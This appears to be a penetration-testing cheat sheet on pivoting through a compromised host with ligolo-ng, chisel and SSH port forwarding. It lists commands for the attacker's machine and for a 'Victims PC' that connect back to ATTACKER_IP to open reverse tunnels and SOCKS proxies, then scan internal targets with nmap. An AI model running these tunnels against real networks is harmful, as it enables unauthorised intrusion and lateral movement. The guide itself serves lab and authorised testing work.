# Pivoting
<img width="1024" height="1024" alt="Husky hacker using ligolo" src="https://github.com/user-attachments/assets/2e539a0a-1a37-42ce-876c-125e24601d6c" />

## Installs 

### Follow this link:
https://www.kali.org/tools/ligolo-ng/ --> Better option, no proxychains setup

https://www.kali.org/tools/chisel/ --> Still good to have just in case

## For Agents
Run this first:
```
echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture
```
```
systeminfo | findstr /B /C:"System Type"
```
Most likely AMD vs AMR

The AMD folder is in this repo. 

## Ligolo Commands
### On Your Machine
```
sudo ./proxy -selfcert
```
or
```
sudo ligolo-proxy -selfcert
```
Default port is 11601

### Victims PC
```
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

### Commands to start the session

```
session
1
autoroute 
select all 
yes
```
The tunnel should be active

### Troubleshooting Command
Just in case things happen:
```
./agent.exe -connect <your ip>:11601 -ignore-cert -retry
```

## Chisel

### On Your Machine
Configure Socks first
```
sudo nano /etc/proxychains.conf
```
Add:
```
socks5 127.0.0.1 1080
```
Comment out socks4, then run the command:
```
chisel server -p 8000 --reverse
```
### On Victim
```
chisel.exe client ATTACKER_IP:8000 R:socks
```
Then run commands:
```
proxychains nmap $target
```
After this is configured, all commands must run through proxy chains. My least favorite, but it works. 

## Portfowarding SSH 
You can use any port, but remember it only works with the port you have an active tunnel on. 

```
ssh -L 3389:$target:3389 user@pivot
```
Then  you can use it locally:
```
xfreerdp /v:127.0.0.1
```
With proxy chains:
```
ssh -L LOCALPORT:TARGET:PORT user@pivot
ssh -D 1080 user@pivot
proxychains nmap TARGET
```
